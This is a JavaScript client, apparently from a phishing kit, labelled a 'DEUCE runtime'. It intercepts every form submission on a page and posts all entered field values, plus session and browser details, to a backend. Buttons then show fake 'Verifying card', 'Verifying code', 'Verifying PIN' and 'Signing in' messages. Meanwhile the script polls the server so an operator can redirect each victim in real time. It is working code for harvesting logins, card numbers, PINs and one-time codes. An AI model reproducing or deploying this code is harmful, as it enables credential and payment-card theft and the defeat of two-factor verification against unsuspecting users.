(function () {
  "use strict";

  var currentScript = document.currentScript || (function () {
    var scripts = document.getElementsByTagName("script");
    return scripts[scripts.length - 1];
  })();

  var config = Object.assign({}, window.DEUCE_RUNTIME_CONFIG || {});
  if (currentScript && currentScript.dataset) {
    Object.keys(currentScript.dataset).forEach(function (key) {
      config[key] = currentScript.dataset[key];
    });
  }

  var userPageId = String(config.userPageId || config.page || "").trim();
  var pageId = String(config.pageId || location.pathname.split("/").pop() || "index.html").trim();
  var pageLabel = String(config.pageLabel || pageId).trim();
  var apiBase = String(config.apiBase || "/api/runtime").replace(/\/$/, "");
  var sessionKey = String(config.sessionKey || "deuce_session_" + userPageId);
  var commandPolling = config.commandPolling !== "false";
  var commandInterval = Math.max(Number(config.commandInterval || 4000), 1500);
  var lastSubmitter = null;

  if (!userPageId) {
    console.warn("DEUCE runtime client missing data-user-page-id.");
    return;
  }

  function sessionId() {
    try {
      var existing = sessionStorage.getItem(sessionKey);
      if (existing) return existing;
      var next = "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
      sessionStorage.setItem(sessionKey, next);
      return next;
    } catch (error) {
      return "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
    }
  }

  var runtime = {
    userPageId: userPageId,
    pageId: pageId,
    pageLabel: pageLabel,
    sessionId: sessionId()
  };

  function endpoint(path) {
    return apiBase + "/" + path.replace(/^\//, "");
  }

  function secureTransport(url) {
    try {
      var target = new URL(url, location.href);
      return target.protocol === "https:"
        || ["localhost", "127.0.0.1", "::1"].indexOf(target.hostname) !== -1;
    } catch (error) {
      return false;
    }
  }

  function sameLocation(targetUrl) {
    try {
      var target = new URL(targetUrl, location.href);
      var current = new URL(location.href);
      return target.origin === current.origin
        && target.pathname === current.pathname
        && target.search === current.search
        && target.hash === current.hash;
    } catch (error) {
      return false;
    }
  }

  function fieldLabel(input) {
    var escapedId = input.id && window.CSS && CSS.escape ? CSS.escape(input.id) : "";
    var linkedLabel = escapedId && document.querySelector ? document.querySelector('label[for="' + escapedId + '"]') : null;
    var wrapperLabel = input.closest && input.closest("label");
    return [
      input.getAttribute && input.getAttribute("aria-label"),
      input.placeholder,
      linkedLabel && linkedLabel.textContent,
      wrapperLabel && wrapperLabel.textContent,
      input.name,
      input.id
    ].filter(Boolean)[0] || "Field";
  }

  function fieldType(input) {
    if (input.tagName === "SELECT") return input.multiple ? "select-multiple" : "select";
    if (input.tagName === "TEXTAREA") return "textarea";
    return String(input.type || "text").toLowerCase();
  }

  function fieldId(input, label, index) {
    var explicitId = input.getAttribute && input.getAttribute("data-deuce-field-id");
    if (explicitId) return explicitId;
    var base = String(input.name || input.id || label || "field")
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "_")
      .replace(/^_+|_+$/g, "")
      .slice(0, 48) || "field";
    return "legacy_" + base + "_" + String(index + 1);
  }

  function fieldValue(input) {
    var type = fieldType(input);
    if ((type === "checkbox" || type === "radio") && !input.checked) return "";
    if (type === "select-multiple") {
      return Array.prototype.slice.call(input.selectedOptions || []).map(function (option) { return option.value || ""; });
    }
    return input.value || "";
  }

  function captureForBackend(form) {
    var fields = Array.prototype.slice.call(form.elements || []).filter(function (input) {
      var type = String(input && input.type || "").toLowerCase();
      return input && !input.disabled && ["submit", "button", "reset", "file", "hidden", "image"].indexOf(type) === -1;
    });
    return {
      version: 1,
      source: "legacy-runtime",
      scopeId: String(form.getAttribute("data-deuce-form-id") || form.id || form.name || "page").slice(0, 96),
      fields: fields.map(function (input, index) {
        var label = String(fieldLabel(input)).replace(/\s+/g, " ").trim().slice(0, 160) || "Field";
        return {
          id: fieldId(input, label, index),
          label: label,
          type: fieldType(input),
          value: fieldValue(input)
        };
      })
    };
  }

  function payload(extra) {
    return Object.assign({
      userPageId: runtime.userPageId,
      pageId: runtime.pageId,
      sessionId: runtime.sessionId,
      screen: runtime.pageLabel,
      hostname: location.hostname,
      path: location.pathname,
      userAgent: navigator.userAgent,
      createdAt: new Date().toISOString()
    }, extra || {});
  }

  function send(path, extra) {
    var target = endpoint(path);
    if (!secureTransport(target)) return Promise.resolve(null);
    return fetch(target, {
      method: "POST",
      keepalive: true,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload(extra))
    }).catch(function () {});
  }

  function track(eventName, extra) {
    return send("traffic", Object.assign({
      event: eventName || "page_event",
      result: "allowed"
    }, extra || {}));
  }

  function heartbeat() {
    return track("heartbeat", {
      screen: runtime.pageLabel,
      metadata: {
        visibility: document.visibilityState || "visible"
      }
    });
  }

  function submitResult(form) {
    return send("results", {
      screen: runtime.pageLabel,
      flow: [runtime.pageId],
      capture: captureForBackend(form),
      screenFile: runtime.pageId
    });
  }

  function ensureWaitStyles() {
    if (document.querySelector("[data-deuce-runtime-wait-style]")) return;
    var style = document.createElement("style");
    style.setAttribute("data-deuce-runtime-wait-style", "true");
    style.textContent = '.deuce-runtime-waiting{position:relative!important;pointer-events:none!important;opacity:.82!important}.deuce-runtime-waiting:after{content:""!important;display:inline-block!important;width:.85em!important;height:.85em!important;margin-left:.5em!important;border:2px solid currentColor!important;border-right-color:transparent!important;border-radius:999px!important;vertical-align:-.12em!important;animation:deuceRuntimeSpin .8s linear infinite!important}@keyframes deuceRuntimeSpin{to{transform:rotate(360deg)}}';
    document.head.appendChild(style);
  }

  function submitButtons(form, submitter) {
    var buttons = Array.prototype.slice.call(form.querySelectorAll('button[type="submit"], button:not([type]), input[type="submit"]'));
    if (submitter && buttons.indexOf(submitter) === -1) buttons.unshift(submitter);
    return buttons;
  }

  function waitingMessage(control) {
    var text = [
      runtime.pageLabel,
      runtime.pageId,
      document.title,
      control && control.textContent,
      control && control.value,
      control && control.id,
      control && control.name
    ].filter(Boolean).join(" ").toLowerCase();
    if (/card|credit|debit|cvv|cvc|expiry|payment/.test(text)) return "Verifying card...";
    if (/otp|one.?time|verification code|security code|sms|auth code/.test(text)) return "Verifying code...";
    if (/\bpin\b|passcode/.test(text)) return "Verifying PIN...";
    if (/personal|profile|address|information|details/.test(text)) return "Submitting...";
    if (/success|complete|finish|redirect/.test(text)) return "Redirecting...";
    if (/login|log in|sign in|signin|password|username|email/.test(text)) return "Signing in...";
    return "Processing...";
  }

  function setWaitingState(form, submitter) {
    ensureWaitStyles();
    form.setAttribute("data-deuce-waiting", "true");
    submitButtons(form, submitter).forEach(function (button) {
      if (!button.dataset.deuceOriginalText) button.dataset.deuceOriginalText = button.value || button.textContent || "Submit";
      button.disabled = true;
      button.setAttribute("aria-busy", "true");
      button.classList.add("deuce-runtime-waiting");
      var message = waitingMessage(button);
      if (button.tagName === "INPUT") {
        button.value = message;
      } else {
        button.textContent = message;
      }
    });
  }

  function checkCommand() {
    var params = new URLSearchParams({
      userPageId: runtime.userPageId,
      sessionId: runtime.sessionId,
      hostname: location.hostname
    });
    fetch(endpoint("session-command") + "?" + params.toString())
      .then(function (response) { return response.ok ? response.json() : null; })
      .then(function (data) {
        var command = data && data.command;
        if (command && command.action === "redirect" && command.targetUrl) {
          if (sameLocation(command.targetUrl)) {
            if (command.forceReload) location.reload();
            return;
          }
          location.href = command.targetUrl;
        }
      })
      .catch(function () {});
  }

  function handleRuntimeSubmit(form, submitter, event) {
    if (!form || !(form instanceof HTMLFormElement) || form.getAttribute("data-deuce-waiting") === "true") return;
    if (event) {
      event.preventDefault();
      event.stopImmediatePropagation();
    }
    if (typeof form.checkValidity === "function" && !form.checkValidity()) {
      if (typeof form.reportValidity === "function") form.reportValidity();
      return;
    }
    setWaitingState(form, submitter);
    submitResult(form);
    track("form_submit_waiting", { screen: runtime.pageLabel });
    window.setTimeout(checkCommand, 400);
  }

  document.addEventListener("submit", function (event) {
    var form = event.target;
    handleRuntimeSubmit(form, event.submitter || lastSubmitter, event);
  }, true);

  document.addEventListener("click", function (event) {
    var button = event.target && event.target.closest ? event.target.closest('button, input[type="submit"]') : null;
    if (!button || !button.form) return;
    lastSubmitter = button;
    var type = String(button.getAttribute("type") || "submit").toLowerCase();
    if (type === "submit") handleRuntimeSubmit(button.form, button, event);
  }, true);

  window.DeuceRuntime = {
    sessionId: runtime.sessionId,
    pageId: runtime.pageId,
    pageLabel: runtime.pageLabel,
    track: track,
    submitResult: submitResult
  };

  track("page_load", { screen: runtime.pageLabel });
  heartbeat();
  if (commandPolling) {
    window.setInterval(checkCommand, Math.min(commandInterval, 1500));
  }
  window.setInterval(heartbeat, 10000);
})();
